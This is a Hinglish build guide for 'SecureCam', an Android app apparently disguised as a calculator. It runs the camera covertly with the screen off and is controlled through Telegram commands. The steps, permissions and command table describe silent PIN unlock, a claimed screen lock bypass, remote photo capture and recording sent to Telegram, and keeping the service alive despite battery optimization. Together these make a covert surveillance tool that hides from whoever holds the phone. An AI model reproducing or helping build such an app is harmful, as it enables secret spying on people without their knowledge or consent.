# 🚀 SecureCam APK Build Guide — Complete

## 📱 Kiya Kya Hoga?

| Feature | Browser | APK |
|---------|---------|-----|
| Calculator UI (hidden) | ✅ | ✅ |
| Camera background | ✅ | ✅ |
| Motion detection | ✅ | ✅ |
| Telegram commands | ✅ | ✅ |
| **Screen OFF chalega** | ❌ | ✅ |
| **App background me chalega** | ❌ | ✅ |
| **Telegram `/add` se screen wake** | ❌ | ✅ |
| **Screen lock bypass** | ❌ | ✅ |

---

## Step 1: Project Setup

```bash
# SecureCam folder me jao
cd secure-cam

# Capacitor install karo
npm init -y
npm install @capacitor/core @capacitor/cli @capacitor/android

# Capacitor init karo
npx cap init SecureCam com.securecam.app --web-dir=.
npx cap add android
```

---

## Step 2: Native Files Copy Karo

```bash
# BackgroundCamera Plugin copy
cp native-background-camera/app/src/main/java/com/securecam/app/BackgroundCameraPlugin.java \
   android/app/src/main/java/com/securecam/app/

# Foreground Service copy
cp native-background-camera/app/src/main/java/com/securecam/app/CameraForegroundService.java \
   android/app/src/main/java/com/securecam/app/

# MainActivity merge karo — file already hai, bas registerPlugin line add karo
# open android/app/src/main/java/com/securecam/app/MainActivity.java
```

**MainActivity.java** me yeh change karo:
```java
package com.securecam.app;

import android.os.Bundle;
import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        // 👇 Yeh line add karo
        registerPlugin(BackgroundCameraPlugin.class);
        super.onCreate(savedInstanceState);
    }
}
```

---

## Step 3: Android Manifest Update

`android/app/src/main/AndroidManifest.xml` kholo aur permissions add karo:

```xml
<!-- Permissions - <manifest> ke andar -->
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
<uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
<uses-feature android:name="android.hardware.camera" android:required="true" />
<uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />

<!-- Service - <application> ke andar, <activity> ke saath -->
<service
    android:name=".CameraForegroundService"
    android:foregroundServiceType="camera"
    android:exported="false" />
```

---

## Step 4: Web Files Sync

```bash
# Web files (index.html, style.css, app.js) ko Android project me copy karo
npx cap sync android
```

---

## Step 5: APK Build

```bash
cd android

# Debug APK
./gradlew assembleDebug

# Release APK (production)
# ./gradlew assembleRelease
```

APK milega: `android/app/build/outputs/apk/debug/app-debug.apk`

---

## Step 6: Phone Me Install & Setup

1. APK install karo
2. Open karo → Calculator dikhega
3. `243` + `=` → PIN unlock (silent)
4. App background me camera chalne lagega
5. **Screen OFF karo → Camera chalega**
6. **Telegram se `/add YOUR_USERNAME` bhejo → Screen on ho jayegi!**

---

## ⚡ Telegram Commands (Sab kaam karenge)

| Command | Kya Hoga |
|---------|----------|
| `/snap username` | Photo leke Telegram bhejega |
| `/start_rec username` | Recording start (screen off bhi) |
| `/stop_rec username` | Recording stop |
| `/arm username` | Motion detection ON |
| `/disarm username` | Motion detection OFF |
| `/cam_on username` | Camera ON |
| `/cam_off username` | Camera OFF |
| `/add username` | **Screen ON + Unlock!** 🔥 |
| `/status username` | Current status batayega |

---

## ⚠️ Battery Optimization (Zaroori)

Phone pe install karne ke baad:

```
Settings → Apps → SecureCam → Battery → Unrestricted
```

Ya:
```
Settings → Battery → Battery Optimization → SecureCam → Don't Optimize
```

Nahi to kuch OEMs (Xiaomi, Oppo, Vivo, Samsung) service ko maar denge.

---

## 🔄 Re-build after changes

Agar kabhi `index.html`, `app.js` ya `style.css` me changes karo:

```bash
npx cap sync android
cd android && ./gradlew assembleDebug
```

---

## 📁 Final Folder Structure

```
secure-cam/
├── index.html          # Calculator UI
├── app.js              # Main logic
├── style.css           # Styles
├── package.json        # Capacitor config
├── android/            # Android project (generated)
│   └── app/
│       └── src/
│           └── main/
│               ├── AndroidManifest.xml
│               └── java/com/securecam/app/
│                   ├── MainActivity.java
│                   ├── BackgroundCameraPlugin.java
│                   └── CameraForegroundService.java
└── native-background-camera/
    └── ...
```
